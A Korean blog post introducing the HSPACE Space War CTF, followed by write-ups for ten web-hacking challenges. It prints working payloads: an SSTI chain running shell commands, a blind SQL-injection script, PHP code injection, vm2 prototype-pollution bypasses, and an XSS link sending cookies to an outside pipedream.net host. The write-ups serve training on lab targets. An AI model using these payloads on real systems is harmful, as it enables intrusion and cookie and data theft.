---
title: Space War 2024-1 Web write-up
description: Space War 2024#1 Web write-up입니다.
author: ipwn
date: 2024-04-05 02:17:35 +0900
tags: [spacewar, webhacking]
categories: [SpaceWar, Webhacking]
math: true
mermaid: false
pin: false
---

### 목차

1. 스페이스 워(Space War)?
2. for_beginner
3. for_beginner-SQL
4. Magic Eye
5. web101
6. Online Calculator
7. Sandbox
8. trick
9. Node
10. APIserver
11. Multiline PHP challenge

안녕하세요, Space War 2024#1 Web hacking CTF 파트의 write-up을 맡게 된 안건희(ipwn)입니다.
사실 제가 주로 공부하는 분야는 웹해킹이 아니라는 옥에 티(..)가 있지만, 출제자의 write-up을 공유하려는 목적으로 작성된 블로그 포스트이니만큼 아무래도 괜찮을 것 같습니다.

이번 포스트에서는 목차에 적혀있는 것처럼 Space War가 무엇인지! 어떤 대회인지! ...에 대해 간단히 이야기 드리고 이후에 출제자 분들의 write-up을 공유드리면서 마무리 하겠습니다.
<br><br>

---

## 스페이스 워(Space War)?

**스페이스 워(Space War)**는 HSPACE에서 진행하는 정기 CTF입니다! 그러나 이미 HSPACE에 대해 잘 알고 계신 분들이라면 아시겠지만, 사실 HSPACE에서는 과거부터 CTF를 계속 개최해왔습니다. 파트너십을 맺은 대학 동아리들의 신청을 받아 해당 동아리들만을 위해 개최한 **Partner CTF**가 있었으나 해당 대회에서 여러 개편과정을 거쳐 지금의 스페이스 워가 탄생하였습니다.

그럼 여기서 Space War와 Partner CTF는 어떻게 다른지에 대해서 설명드리겠습니다.

### 1. 파트너 CTF

우선 파트너 CTF입니다. 파트너 CTF는 앞서 이야기한 것처럼 HSPACE와 파트너십을 맺은 파트너 동아리들의 내부 인원이 도전할 수 있는 CTF 대회였습니다.<br>
장점으로는 각 동아리들이 내부 대회가 필요할 때마다 신청을 통해 대회를 개최할 수 있었고, 요청 사항에 필요한 사항을 구체적으로 작성할 수 있었습니다. 때문에 파트너 동아리의 특수한 상황을 대부분 고려하여 반영할 수 있습니다.<br>
그러나, 반대로 동일한 시간에 여러 파트너 동아리들이 CTF 진행을 요청하는 경우에는 동아리마다의 특수한 요구사항(특정 분야의 문제만 요청, 난이도 하향조정 요청 등)을 모두 반영할 수 없었고, 이 외에도 각 동아리마다 해결할 수 있는 문제의 난이도가 모두 천차만별이기에 문제 출제진들에게는 매우 까다롭다는 문제 등 다양한 단점 역시 존재했습니다.

### 2. 스페이스 워

이제 스페이스 워입니다. 매월 정기적으로 대회를 개최하며 월마다 진행되는 중요 행사들의 일정을 반영하여 1회에서 2회 사이로 대회를 개최합니다. 또한 매 대회마다의 테마가 정해져 있습니다. 예시로 24년 1월에는 웹해킹 테마와 포너블 테마, 2월에는 리버싱 테마와 크립토 테마의 대회가 개최되는 등의 형식입니다. <br>
장점으로는 아무래도 참여하는데에 제약이 없다는 점입니다. 이전의 파트너 CTF와는 다르게 HSPACE의 회원이라면 모두가 참여할 수 있고, 수상의 개념도 공식적으로 추가되었습니다. 물론 부상(副賞)역시 존재합니다. 또한 정기적으로 대회가 개최되기 때문에, 본인이 참여할 수 있는 시간에 적절히 참여하면 됩니다. 게다가 테마가 정해져 있기 때문에 본인이 원래 잘하던 분야에 집중하여 순위권을 노려볼수도 있고 상대적으로 약했던 분야를 연습하기에도 유용합니다. <br>
단점으로는 아무래도 모두의 요구사항을 수용하기에는 어려움이 있고, 비슷한 결로 개인이나 단체가 원하는 시간에 원하는 테마의 대회를 즉시 참여할 수는 없다는 아쉬움은 있습니다.

위 두 대회의 차이점으로 미뤄보았을 때, **스페이스 워**의 방식을 채택하는 것이 참가하시는 분들, 그리고 HSPACE에게도 더 좋은 결과를 낳을 것이라 판단하게 되어 스페이스 워가 HSPACE의 공식 대회로 책정되었습니다.

그리 하여.. 지금의 스페이스 워가 탄생되었습니다! 스페이스 워에 대한 더 자세한 설명은 HPSACE 공식 카카오톡 오픈 채팅과 디스코드에서 확인하실 수 있으니 관심있으신 분들은 참고해주시면 좋을 것 같습니다. 오픈 채팅과 디스코드의 링크는 [HSPACE 공식 홈페이지](https://hspace.io/)에서 확인해보실 수 있습니다.

Space War에 대한 설명은 이쯤으로 마치고.. 2024년 1월 웹해킹 테마로 진행되었던 각 문제들의 출제자 write-up을 공유드리고 포스팅을 마치도록 하겠습니다. 긴 글 읽어주셔서 감사합니다.

**PS:** write-up을 읽지 않고 (혹은 읽으면서) 직접 문제를 해결해보고 싶으신 분들은 [HSPACE 워게임](https://chall.hspace.io/)에서 직접 문제를 풀어보실 수 있으니 많은 관심 부탁드립니다.

---

## for_beginner

**출제자 책정 난이도**: Easy

정말 간단한 ssti다.

```python
blacklist = ['os','subprocesses','exec','vars','sys','"','\+','open','rm','main','static','templates','ctf','rf','spawnlp','execfile','dir','dev','tcp','sh','import','built','__class__','for','request','\,','app','file','url_for','\[','\]','config']

def Prevent_SSTI(input):
    for i in blacklist:
        res = re.search(i,input)
        if res:
            return True
    else:
        return False

@app.route('/')
def main():
    name = request.args.get("name", "World")
    return render_template_string(f'Hello {name}!!')
```

name 파라미터로 데이터를 받은 뒤 render_template_string 함수를 이용해서 template rendering을 해주는 전형적인 ssti 문제다.
필터링이 걸려있는데, 우리가 고려해야할 것은 단지 `[,]`를 쓰지 못한다는 것이다. 이러한 것은 |와 attr을 이용하여 pyjail 풀 듯이 os나 subprocess 모듈 찾아서 함수 실행해주면 된다.

{% raw %}

```python
{{%27%27|attr(%27\x5f\x5fclass\x5f\x5f%27)|attr(%27\x5f\x5fmro\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(1)|attr(%27\x5f\x5fsubclasses\x5f\x5f%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(494)(%27cat%20flag.txt%27,shell=True,stdout=-1)|attr(%27communicate%27)()}}
```

{% endraw %}

### 블로그 포스트 작성자의 추가적인 코멘트

이러한 기본적인 ssti 형식의 문제는 보통 `render_template_string`같이 템플릿을 렌더링해주는 함수를 직접적으로 호출하고, 해당 함수 내로 우리의 입력을 바로 전달할 수 있습니다. 이후에는 가지고 계신 지식으로 간단히 exploit을 할 수 있는데, [기본 ssti 공부](https://www.linkedin.com/pulse/studying-ssti-jinja2-python-rce-shell-luiz-henrique-amaral-pereira/)를 위한 사이트를 훑어보시면 좋습니다. 또는 보통 [ssti 치트 시트](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)으로 직접적으로 해결되는 경우가 많으니 해당 치트 시트의 페이로드들이 어떤식으로 작동하는지 살펴보시는 것도 좋은 방법입니다. <br>
개인적인 의견으로는 그냥 치트 시트를 사용해서 문제를 해결하기만 하는 건 성장에 큰 도움이 되지 않는다고 생각합니다. 반드시 이런 기본적인 문제들을 통해서 **이해**하는 과정을 거치시면 좋겠습니다!

`python`에 대한 지식과 `jinja template ssti`에 대한 지식이 있으면 쉽게 해결할 수 있는 문제였습니다.

---

## for_beginner-SQL

**출제자 책정 난이도**: Easy

```php
$userid = $_GET['userid'];
$password = $_GET['password'];

if(isset($userid) && isset($password)) {
    $query = "SELECT userid, password FROM user WHERE userid = '${userid}' and password = '".md5($password)."'";
    try {
        $result = $mysqli->query($query);
        $data = mysqli_fetch_array($result);
        if(isset($data) && $data[0] == "admin" && $data[1] === md5($password)){
            die($flag);
	    } else {
		    die("Wrong...");
	    }
    } catch(Exception $e) {
    }
} else {
    show_source(__FILE__);
}
```

전형적인 sqli 문제다.
admin의 평문 password를 맞게 구하여 로그인하면 플래그를 얻을 수 있다.

이때 sqli의 성공 여부를 확인할 수 없기 때문에 time based sqli를 해주면 된다.

**exploit.py**

```py
import requests
import time
SERVER = "http://localhost:2023"

a = "1234567890abcdef"

pw = ""
for i in range(1,33):
    for j in a:
        url="http://localhost:2023/index.php?userid=admin%27and%20substr(password,"+str(i)+",1)=\""+str(j)+"\"%20and%20sleep(2)%23&password=1"
        starttime = time.time()
        res = requests.get(url)
        endtime = time.time()
        res = res.text
        if endtime-starttime>2:
            pw+=j
            print(pw)
            break
        else:
            pass
```

위 exploit을 이용하면 아래의 password hash를 얻을 수 있다.

```
ede6b50e7b5826fe48fc1f0fe772c48f
```

이를 md5 rainbow table에서 검색해보면 1q2w3e4r5t6y라는 평문 값을 얻을 수 있고 이를 이용하여 로그인을 하면 플래그를 얻을 수 있다.

### 블로그 포스트 작성자의 추가적인 코멘트

위 문제도 `$query = "SELECT userid, password FROM user WHERE userid = '${userid}' and password = '".md5($password)."'";`라는 쿼리에서 `'${userid}'`에 대한 그 어떠한 필터도 존재하지 않아서 쉽게 SQL injection 취약점이 발생하는 것을 확인할 수 있습니다. <br>
출제자 분의 말씀처럼 SQL injection 취약점은 발생하지만 쿼리의 실행 결과를 확인할 수 없기 때문에, 웹 서버의 응답(서버의 응답시간, 응답 코드 등)을 통해서 정보를 비교하여 값을 유출시켜야 합니다. 출제자 분의 경우에는 `sleep`함수를 이용하여 서버의 응답시간이 얼마나 걸리는지를 판단하여 패스워드의 해시를 누출하셨습니다. 하지만 해당 방법이 아니라 문자열을 비교하여 참(혹은 거짓)일 때에 에러를 유발시켜 응답을 판단할 수도 있습니다. <br>
또한 출제자 분의 의도치 않은 풀이로는 union based SQL injection을 통해서도 풀이를 할 수 있습니다(!!) 해당 풀이는 자세히 설명하지 않겠습니다. 관심있으신 분들은 한 번씩 시도해보시길 바랍니다.

이 문제도 `SQL injection`에 대한 간단한 지식이 있으면 해결할 수 있는 문제였습니다.

---

## Magic Eye

**출제자 책정 난이도**: Easy

```python
@app.route("/<path:path>")
def check(path):
    print(path)
    if FLAG_PATH == path:
        "Wow, the final flag is (what_you_got) + <code>_cab2038942053898e0e6486cebfd368a}</code>"
    elif FLAG_PATH[:len(path)] == path:
        return "Not Found", 200
    return "Not Found", 404
```

경로로 입력되는 부분을 flag의 앞부분부터 비교하여 맞으면 200, 틀리면 404를 반환해준다.
정말 간단하기 때문에 대충 코드 짜서 status code가 200일 때를 기준으로 플래그를 뽑아주면 된다.

### 블로그 포스트 작성자의 추가적인 코멘트

위 문제는 단순히 `https://server_addr/<path>`의 형태로 서버에 요청을 전송할 때 `<path>`부분에 flag를 한 글자씩 무차별 대입을 하는 문제였습니다. `python flask` 웹 서버는 어떤식으로 동작하는지에 대한 아주 간단한 지식이 있으면 풀이할 수 있는 문제였습니다. (라고는 하지만.. 사실 처음 문제를 풀어보신다면 지식의 영역보다는 감의 영역인 문제인지라 헷갈릴 수도 있겠습니다..)

---

## web101

**출제자 책정 난이도**: Easy

그냥 숨겨진 파일과 폴더를 하나씩 게싱해서 찾아나가면 된다.

### 블로그 포스트 작성자의 추가적인 코멘트

웹 상에서 서버를 배포할 때 개발자의 실수로 인해 지워지지 않은 민감 정보가 담긴 파일들이 유출되었을 때를 가정한 문제였습니다. 그 외에도 웹을 구성하는 기본 요소 파일들과 `admin`과 같이 한 번쯤 입력해봄직한(...) 디렉토리 및 파일들에 플래그의 조각들이 담겨있습니다.

파일들의 리스트는 다음과 같습니다. (리스트의 넘버링은 플래그 조각의 순서와 상관없습니다.)

1. git directory
2. admin directory
3. .index.php.swp
4. .index.html.swp
5. flag.txt
6. robots.txt

이런식으로 `path`에 무차별적으로 값을 대입하는 동작을 자동화 하는 툴로는 [dirsearch](https://github.com/maurosoria/dirsearch)가 있습니다. (하지만 이러한 툴의 사용을 허용하지 않는 경우도 많으니 참고정도만 해주시면 좋을 것 같습니다.)

---

## Online Calculator

**출제자 책정 난이도**: Medium

```php
<?php
  $x = $_POST["x"];
  $y = $_POST["y"];
  $op = $_POST["op"];
  $message = $_POST["message"];
  $user_answer = $_POST["user_answer"];

  if(!$x || !$y || !$op || !$message || !$user_answer) {
    die("something wrong");
  }

  //validate values
  $x = (float)($x);
  $y = (float)($y);

  if(preg_match("/[^+\-*\/]/", $op)) {
    die("no hack");
  }

  $message = addslashes($message);
  $user_answer = (float)($user_answer);

  $code = "
<?php
\$real_answer = $x $op $y;
if (\$real_answer == $user_answer) {
  echo '<script>alert(`$message`); location.href=`../index.php`;</script>';
} else {
  echo '<script>alert(`wrong`); location.href=`../index.php`;</script>';
}
  ";

  $fn = "calc/".sha1(random_bytes(16)).".php";
  file_put_contents($fn, $code);

  header("Location: $fn");
?>
```

사용자로부터 여러 입력을 전달받은 뒤 template을 이용해서 calc 폴더에 php 파일을 드랍하고 해당 위치로 이동시켜주는 코드다.
우린 쉘을 획득해서 flag 파일을 읽어야하기 때문에 filter를 우회해서 code injection을 해야한다.

일단 x,y, user_answer 파라미터는 float으로 변환하는 코드로 인해 공격에 사용할 수 없다. 그럼 이제 우리가 사용할 수 있는건 message, op 파라미터인데 op 파라미터엔 preg_match를 이용한 filter가, message엔 addslashes가 있다.

이는 php의 문법적 특징을 이용하면 우회하는 것이 가능하다.

```plaintext
op : /*

message: */; system(<<<EOF
ls
EOF); ?>
```

위와 같이 전달해줄 경우 주석으로 인해 message 파라미터에 포함된 내용이 php code로 인식될 것이고 addslashes에 관계없이 ls를 실행하는 것이 가능하다.

### 블로그 포스트 작성자의 추가적인 코멘트

해당 문제는 처음 접하기에는 사실 꽤나 트릭적인 문제입니다. 그리고 동시에 기초 사고력을 기를 수 있는 문제입니다. 내가 전달할 수 있는 입력이 여러 개일 때를 모두 고려하지 못하고 한 가지의 입력이나 방향에서 생각이 고착화 된다면 해답을 생각해내기 어렵습니다. <br>
우리의 입력으로부터 생성되는 `php` 코드의 동작을 어떻게 내가 원하는 방향으로 하이재킹 할 수 있을지 잘 고려해보아야 합니다. 문제를 대충 살펴보게 되면 `message`변수는 단순히 `javascript`에서만 활용되리라 착각하기 쉽지만 `op`의 변수와 잘 엮어준다면 `php`의 코드 역시 삽입될 수 있다는 점을 잘 파악해야만 합니다.<br>
`php`의 문법을 알고있고, 조금만 창의적으로 생각해본다면 해결할 수 있는 문제였습니다.

---

## Sandbox

**출제자 책정 난이도**: Medium

```javascript
if (req.userUid == -1 || !req.userData)
  return res.json({ error: true, msg: "Login first" });

if (parseInt(req.userUid) != 0)
  return res.json({ error: true, msg: "You can't do this sorry" });

if (req.userData.length > 160)
  return res.json({ error: true, msg: "Too long!!" });

if (checkoutTimes.has(req.ip) && checkoutTimes.get(req.ip) + 1 > now()) {
  return res.json({ error: true, msg: "too fast" });
}
checkoutTimes.set(req.ip, now());

let sbx = {
  readFile: (path) => {
    if (!new String(path).toString().includes("flag"))
      return fs.readFileSync(path, { encoding: "utf-8" });
    return null;
  },
  sum: (args) => args.reduce((a, b) => a + b)
};

let vm = new vm2.VM({
  timeout: 20,
  sandbox: sbx,
  fixAsync: true,
  eval: false
});

let result = ":(";
try {
  result = new String(vm.run(`sum([${req.userData}])`));
} catch (e) {}
res.type("text/plain").send(result);
```

uid가 0이여야 하는데 일반적으론 uid를 0으로 설정하는 것이 불가능하다.
하지만 uid를 0.1e1과 같이 전달할 경우 type casting으로 인해 이를 우회하여 uid가 0인 유저가 될 수 있다.

위를 우회했기 때문에 vm안에서 코드를 실행하는 것이 가능한데 filter로 인해서 flag 파일을 읽는 것이 불가능하다.
이는 Prototype pollution을 이용하면 우회하여 flag 파일을 읽는 것이 가능하다.

```
a={};a.__proto__.protocol='file:';a.__proto__.pathname='/flag.txt';a.__proto__.href='a';a.__proto__.origin='a';a.__proto__.hostname='';readFile([])
```

prototpe pollution을 이용해서 fs.readFileSync가 전혀 다른 파일을 읽도록 하는 것이 가능하다.

회원가입하고 아래와 같이 쿠키를 설정한 뒤 /checkout으로 요청을 보내면 된다.

```
{"username":"ff","password":"123456"}
```

->

```
uid=0.3e1; passwd=8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92; data=1+1])%3ba={}%3ba.__proto__.protocol='file:'%3ba.__proto__.pathname='/flag.txt'%3ba.__proto__.href='asdf'%3ba.__proto__.origin='a'%3ba.__proto__.hostname=''%3breadFile([])//
```

여기서 uid 0.3e1에서 3은 자신이 부여받은 uid를 넣어주면 된다.

### 블로그 포스트 작성자의 추가적인 코멘트

Node.js의 vm run을 우리의 input으로 그대로 이용하고 있기 때문에 `prototype pollutiuon`을 유발시킬 수 있다는 점은 쉽게 알 수 있습니다. 이 점을 알고있다면, 사실 위에 적혀있는 풀이처럼 필터링되어있는 `readFileSync`의 흐름을 조작할 수 있는 것은 잘 알려져있는 익스플로잇 방법입니다. <br>
때문에, vm이 run 될 때, 실행할 수 없는 `child process`같은 방법이 아니라 vm 외부에서의 동작을 조작할 수 있는 방법에 대해 고민해보는 점이 풀이에 다가가기 위해 매우 중요합니다. 우리는 이러한 사고를 통해 prototype pollution을 생각해낼 수 있습니다. <br>
결론적으로는 prototype pollution에 대해 알고 있는지에 대해 물어보는 문제였습니다. 개인적으로는 prototype pollution을 떠올릴 수 있는 관련 키워드가 문제 설명에 적혀있었다면 어땠을까 하는 생각이 드는 것 같습니다.

---

## trick

**출제자 책정 난이도**: Hard

```python
@app.route("/")
def index():
    name = request.args.get('name', "").replace("(","").replace(")","").replace("{","").replace("}","")
    code = request.args.get('code', "").replace("(","").replace(")","").replace("{","").replace("}","")
    title = request.args.get('title', "")
    content = request.args.get('content', "")
    ctx = {
        'nonce': os.urandom(32).hex(),
        'note': {
        'title': title,
        'content': content,
        },
        'name': name,
        'code': code,
        'is_admin': 0
    }
    return render_template("index.html", **ctx)
```

매우 간단한 구성을 가진 코드다. xss를 해야하는데 csp가 걸려있다.

```default-src 'self'; base-uri 'none'; script-src 'nonce-~~'
    'unsafe-inline'; require-trusted-types-for 'script'; trusted-types default"
```

굉장히 튼튼해보이며, template이 들어가는 곳엔

```
{{ note | safe }}
```

sanitize 없이 우리의 Input이 출력된다.
Injection이 가능한 point는 2곳이 있는데

```html
<script nonce="{{ nonce }}">
  const debug = () => {
      const name = "{{ name | safe }}";
      const code = "{{ code | safe }}";
      console.log(`${name} : execute debug mode`)
      eval(code);
  }
  if ({{ is_admin }}) {
      debug();
  }
</script>
```

첫 번째는 맨 먼저 나오는 스크립트 태그,
두 번째는 마지막 스크립트 태그에 있다.
이때 name, code 파라미터엔 `(,),{,}`가 필터링되었기 때문에 quote를 탈출해도 임의의 함수 실행이 불가능하다.
2번째 인젝션 포인트에선 `(,),{,}`를 사용할 수 있지만 json 형태로 변형되며 backslash가 붙기 때문에 quote를 탈출할 수 없다.
이를 익스플로잇하기 위해선 nonce bypass를 위해 script 태그의 탈출 없이 이미 정의된 script tag 내에서 함수를 실행해야한다.
여기서 대충 html 스펙을 이용한 트릭을 사용해주면 된다.

```
<!--<script//*
```

위의 코드를 name이나 code 파라미터에 넣을 경우 script data double escape state라는 쌈뽕한 것을 사용할 수 있다.
이는 html parser가 파싱할 때 각 태그를 토큰화하여 분석하기 때문인데
https://html.spec.whatwg.org/multipage/parsing.html#script-data-double-escape-start-state
이걸 읽어보자.

아무튼 저걸 쓰면 2개의 html을 기가막히게 합칠 수 있다. 그럼 아래 부분에서 마저 인젝션을 해주면 xss를 얻을 수 있다.

```
http://server:8188/report?url=http://web:8080/?title=adsf%26name=<!--<script//*%26content=<img src=%27*/};location.replace(`https://enllwt2ugqrt.x.pipedream.net/${document.cookie}`);console.log({//</script><!--
```

### 블로그 포스트 작성자의 추가적인 코멘트

우리의 input이 raw하게 그대로 우리가 사용하는 html에 삽입된다는 점은 쉽게 파악할 수 있지만, 그 이후의 exploit이 어려운 문제입니다. XSS의 문제가 출제되었지만 비슷한 형식의 filter가 주어져있던 과거 문제들을 서칭해보거나 html에 관련한 트릭들에는 어떤 것들이 있는지 공부해보면 해결할 수 있는 문제입니다. <br>
어떤 문제든 CTF에 출제된 문제들은 결국 **풀리기 위해** 존재하는 문제들입니다. 위와 같이 csp의 제약과, 한 script태그 내에서 익스플로잇을 진행해야하는 점을 감안한다면 현 상황에서는 html parsing 과정에서 발생할 수 있는 트릭과 같이 다양한 트릭들을 떠올려볼 수 있습니다. <br>
웹해킹의 경우에는 이러한 트릭들이 단순히 CTF 뿐만 아니라 0-day 익스플로잇에 사용되는 경우도 많습니다. 때문에, CTF 문제들의 업솔빙과 다양한 1-day 리서치를 진행해보는 것도 이러한 유형의 문제들을 푸는데에 도움이 많이 될 것 같습니다. 마치 지식들을 뇌에 기억해두었다가 필요할 때 백과사전처럼 필요한 정보를 꺼내 활용하는 것처럼 말입니다.

---

## Node

**출제자 책정 난이도**: Hard

```javascript
const { openDelimiter } = require("ejs");
const express = require("express");
const fs = require("fs");
const ejs = require("ejs");

const app = express();

const template = `<!DOCTYPE html>
<html>
<head>
    <title>Example</title>
</head>
<body>
    Content:
    PAGE
</body>
</html>`;

app.get("/", (req, res) => {
  const page = req.query.page || "1";
  let data = fs.readFileSync(`./page/${page}`).toString();
  let render_data = ejs.render(template.replace("PAGE", data));
  res.send(render_data);
});

app.listen(8080, () => {
  console.log(`Listening on http://0.0.0.0:8080`);
});
```

page 파라미터로 값을 전달받은 뒤 fs.readFileSync 함수로 해당 내용을 읽어온 뒤 template과 함께 ejs template 렌더링을 해준다.
여기서 path traversal이 되는데 flag파일에 권한이 없기 때문에 쉘을 따야한다.
하지만 node를 실행하는 부분의 인자를 확인해보면 다음과 같은 내용을 확인할 수 있다.

```
node --experimental-permission --allow-fs-read=/* --allow-fs-write=/* /app/app.js
```

실험 기능을 통해서 파일 read와 write만 허용해놔서 child_process 같은 모듈을 이용한 rce가 불가능하다.

그럼 좀 다른 방법을 이용해서 쉘을 획득해야하는데 해당 문제에서 nginx를 사용하는 것, path traversal을 이용하여 임의의 파일을 읽을 수 있는 것을 이용하면 원하는 template를 렌더링시킬 수 있고 이때 임의의 함수 실행을 통해 쉘을 획득하는 것이 가능하다.

nginx에서 특정 크기 이상의 body data는 임시 파일 형태로 잠시 저장하는 것을 이용, /proc/pid/fd에 접근하여 해당 파일을 include하는 것으로 임의의 템플릿을 로드할 수 있다.
쉘은 쉘코드를 이용하여 획득하면 되는데 임의의 파일 쓰기, 읽기가 되기 때문에 /proc/self/mem을 열어서 맞는 offset에 쉘코드를 작성하면 쉘을 획득할 수 있다.

exploit 폴더에 있는 ex.py를 실행하면 exploit.js를 서버에 업로드해주는데
이때

```
http://server/?page=../../../../proc/{nginx_pid}/fd/{random_fd}
```

로 접근해보면 특정 fd 값에서 업로드되고 있는 exploit.js의 내용이 Include되는 것을 확인할 수 있다.
그럼 이제 쉘코드를 수정해서 내 서버로 리버스쉘을 연결하도록 하고 다시 공격을 진행하면 특정 offset에서 쉘을 획득할 수 있다(서버 환경마다 좀 바뀌므로 여러 번의 시도가 필요하다)

### 블로그 포스트 작성자의 추가적인 코멘트

출제자분이 너무 상세하게 풀이를 잘 써주셔서 따로 코멘트 할만한 점은 없는 것 같습니다..만! 위 문제는 사실 `Well-known` 취약점 및 익스플로잇입니다. 문제의 내용을 토대로 떠올릴 수 있는 키워드인 `node temp file RCE` 등의 키워드로 구글에 검색해보면 [이런 블로그](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-temp-file-uploads)같은 유용한 검색 결과들을 확인할 수 있습니다. <br>
`Well-known` 취약점들이 CTF에 출제되는 경우는 잦습니다. 떄문에 이러한 문제들을 해결할 때에는 문제와 관련된 정보들을 구글링 해보며 관련 취약점은 어떤 것들이 있는지, 해당 취약점을 어떻게 적용시킬 수 있을지 잘 파악하는 것이 중요하겠습니다. 그리고 앞서 말했던 것처럼 단순히 문제를 푸는 것에서 끝나는 게 아니라 **취약점이 발생하는 이유를 이해하는 것**이 가장 중요합니다.

---

## APIserver

출제자 책정 난이도: **Hard**

```javascript
const UNSAFE_KEYS = ["__proto__", "constructor", "prototype"];

const merge = (obj1, obj2) => {
  for (let key of Object.keys(obj2)) {
    if (UNSAFE_KEYS.includes(key)) continue;
    key = key.trim();
    const val = obj2[key];
    if (typeof obj1[key] !== "undefined" && typeof val === "object") {
      obj1[key] = merge(obj1[key], val);
    } else {
      if (typeof val == "string" && val.startsWith("Function")) {
        obj1[key] = Function(val.slice(8));
      } else {
        obj1[key] = val;
      }
    }
  }
  return obj1;
};
```

prototype pollution이 터진다. 그런데 trim 함수로 인해서 공백을 넣으면 우회할 수 있다.
쉘은 merge 함수 내에서 Function을 만들 수 있는 기능을 이용하면 획득할 수 있다.

하지만 코드 어디를 찾아봐도 함수를 실행해주는 기능은 없다. 이는 간단한 트릭을 이용하면된다.

```javascript
var json =
  replacer || spaces
    ? JSON.stringify(value, replacer, spaces)
    : JSON.stringify(value);
```

express.js의 res.json 함수 내에서 사용하는 stringify 함수의 일부다. 따로 구현을 한 것이 아닌, JSON.stringify 함수를 이용하고 있다.
아래의 코드를 보자.

```
JSON.stringify({"toJSON":Function(`console.log("pwned");`)});
```

이 코드를 실행하면 우린
pwned가 출력되는 것을 확인할 수 있다. 이 기능을 이용하면 따로 실행해주는 로직이 없더라도 단순히 stringify 함수를 통해서 쉘을 획득할 수 있게된다.

아무튼 이를 이용하여 쉘을 획득해주면 된다.

### 블로그 포스트 작성자의 추가적인 코멘트

문제에 적혀있는 설명처럼 `merge`함수 내에서는 안전하지 않은 키워드들을 필터링하는 구문을 잘 삽입해놓고, 그 이후에 `trim` 함수를 호출하는 실수를 범하여 `prototype pollution`을 발생시킬 수 있는 취약점과, `JSON.stringify`를 통한 function call이 가능한 두 가지 취약점을 엮어야 하는 문제였습니다. <br>
내가 아는 코드의 구현 스펙 자체를 이해하고 문제에 접근하는 것이 중요하다는 점을 알 수 있습니다. 단순히 코드상에서는 취약점이 전혀 없어 보여도 내부 구현 스펙상의 문제로 인해 취약점이 발생하는 경우는 웹해킹이 아니라도 잦은 경우입니다. 때문에 개발자가 작성한 코드 상에서의 취약점이 없는 것 같다면 내부 구현 코드를 살펴보는 것도 좋은 방안이라는 걸 배울 수 있는 문제였습니다.

---

## Multiline PHP challenge

**출제자 책정 난이도**: Hard

php filter를 이용한 rce다.

https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d

이걸 이용하되,

```php
if($page[0] === '/' || preg_match("/^.*(\\.\\.|php).*$/i", $page)) {
    die("no hack");
}
```

이 필터를 우회해야한다.
이는

```php
ini_set('pcre.backtrack_limit', 1000);
```

이 설정으로 인해 backtrack_limit에 도달했을 때 preg_match에서 false가 반환되는 것을 이용하여 filter를 우회하고 임의의 파일을 include하여 익스해주면 된다.

이는 ./를 여러 개 넣는 것으로 트리거가 가능하다.

### 블로그 포스트 작성자의 추가적인 코멘트

Hard 난이도의 문제 치고는 간단한 취약점과 풀이의 문제입니다. 유저에게는 `config.php`파일이 주어지지 않아 시도해보기 전까지는 절대 알 수 없는 취약점이지만, `ini_set`함수를 통해 php 내부 처리 로직에 대한 룰을 추가, 삭제, 수정할 수 있다는 점을 알고있다면 어택 벡터가 단순하기 때문에 관련한 취약점들을 의심해볼 수 있습니다. <br>
(하지만.. 포스트 작성자의 의견으로는 조금은 게싱의 영역인 문제로 느껴질 수도 있을 것 같습니다.)

이렇게.. 총 10문제의 문제를 풀이해보았는데, 생각보다는 쉽지 않은 여정이었던 것 같습니다. 이 글을 보고 도움이 되셨다면 구독과 좋아요 알림설정까지 부탁드립니다!
